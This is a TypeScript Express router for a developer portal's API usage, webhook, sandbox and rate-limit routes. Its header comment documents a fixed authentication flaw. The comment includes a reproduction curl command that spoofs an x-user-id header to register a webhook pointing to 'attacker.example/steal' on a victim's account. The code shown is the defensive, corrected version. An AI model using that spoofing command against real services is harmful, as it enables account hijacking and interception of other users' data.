import { Router } from 'express';
import type { Request, Response } from 'express';
import { devportalService } from '../services/devportalService.js';
import { requireAuth } from '../middleware/auth.js';

/**
 * Developer portal: API usage, webhooks, sandbox credentials, rate limits.
 *
 * ## What was wrong
 *
 * None of these routes had `requireAuth`, and every user-scoped one took its
 * identity straight from a request header:
 *
 *     const userId = (req.headers['x-user-id'] as string) ?? 'anonymous';
 *
 * The header is set by the gateway from a verified token, but platform-api
 * listens on its own port and anything that can reach it can send the header
 * itself. Reproduced before the fix, with no Authorization header at all:
 *
 *     curl -X POST localhost:3001/api/v1/developer/webhooks \
 *          -H 'x-user-id: victim-user-0001' \
 *          -d '{"url":"https://attacker.example/steal","events":["job.completed"]}'
 *     → 201 Created, webhook owned by victim-user-0001
 *
 * That registers an attacker-controlled delivery endpoint on someone else's
 * account, and `GET` on the same route listed their webhooks back. `?? 'anonymous'`
 * made it worse: omit the header entirely and every caller shares one identity,
 * so `anonymous`'s sandbox credentials were readable by anybody.
 *
 * Two of the routes had a second, independent problem — they took a webhook id
 * and never checked who owned it, so an authenticated user could fire test
 * deliveries and read delivery logs for anyone's webhook. That is fixed in
 * devportalService, which now requires the owner on both calls.
 *
 * ## The rule now
 *
 * `requireAuth` verifies the JWT signature and populates `req.user`. Identity
 * comes from `req.user.id` and nothing else. `stripIdentityHeaders` removes
 * inbound `x-user-*` before any of this runs, so the old pattern cannot be
 * reintroduced by accident.
 *
 * `/developer/changelog` is deliberately public — it is the same published API
 * changelog for everyone and carries no user scope.
 */

const router = Router();

router.get('/developer/usage', requireAuth, (req: Request, res: Response) => {
  try {
    const period = (req.query.period as string) ?? '30d';
    const usage = devportalService.getApiUsage(req.user!.id, period);
    res.status(200).json({ success: true, data: usage });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.post('/developer/webhooks', requireAuth, (req: Request, res: Response) => {
  try {
    const { url, events } = req.body;
    if (!url || !events || !Array.isArray(events) || events.length === 0) {
      res.status(400).json({
        success: false,
        error: { code: 'VALIDATION_ERROR', message: 'url and events[] are required' },
      });
      return;
    }
    const webhook = devportalService.createWebhook(req.user!.id, url, events);
    res.status(201).json({ success: true, data: webhook });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.get('/developer/webhooks', requireAuth, (req: Request, res: Response) => {
  try {
    const webhooks = devportalService.listWebhooks(req.user!.id);
    res.status(200).json({ success: true, data: webhooks });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.delete('/developer/webhooks/:id', requireAuth, (req: Request, res: Response) => {
  try {
    const deleted = devportalService.deleteWebhook(req.user!.id, req.params.id);
    if (!deleted) {
      res
        .status(404)
        .json({ success: false, error: { code: 'NOT_FOUND', message: 'Webhook not found' } });
      return;
    }
    res.status(200).json({ success: true, data: { deleted: true } });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.post('/developer/webhooks/:id/test', requireAuth, (req: Request, res: Response) => {
  try {
    const log = devportalService.testWebhook(req.user!.id, req.params.id);
    res.status(200).json({ success: true, data: log });
  } catch (err: unknown) {
    const e = err as Error;
    const status = e.message.includes('not found') ? 404 : 500;
    const code = status === 404 ? 'NOT_FOUND' : 'INTERNAL_ERROR';
    res.status(status).json({ success: false, error: { code, message: e.message } });
  }
});

router.get('/developer/webhooks/:id/logs', requireAuth, (req: Request, res: Response) => {
  try {
    const logs = devportalService.getWebhookLogs(req.user!.id, req.params.id);
    res.status(200).json({ success: true, data: logs });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.post('/developer/sandbox', requireAuth, (req: Request, res: Response) => {
  try {
    const creds = devportalService.getSandboxCredentials(req.user!.id);
    res.status(200).json({ success: true, data: creds });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

// Public: the same published changelog for every caller, no user scope.
router.get('/developer/changelog', (_req: Request, res: Response) => {
  try {
    const changelog = devportalService.getApiChangelog();
    res.status(200).json({ success: true, data: changelog });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

router.get('/developer/rate-limit', requireAuth, (req: Request, res: Response) => {
  try {
    const status = devportalService.getRateLimitStatus(req.user!.id);
    res.status(200).json({ success: true, data: status });
  } catch (err: unknown) {
    const e = err as Error;
    res.status(500).json({ success: false, error: { code: 'INTERNAL_ERROR', message: e.message } });
  }
});

export default router;
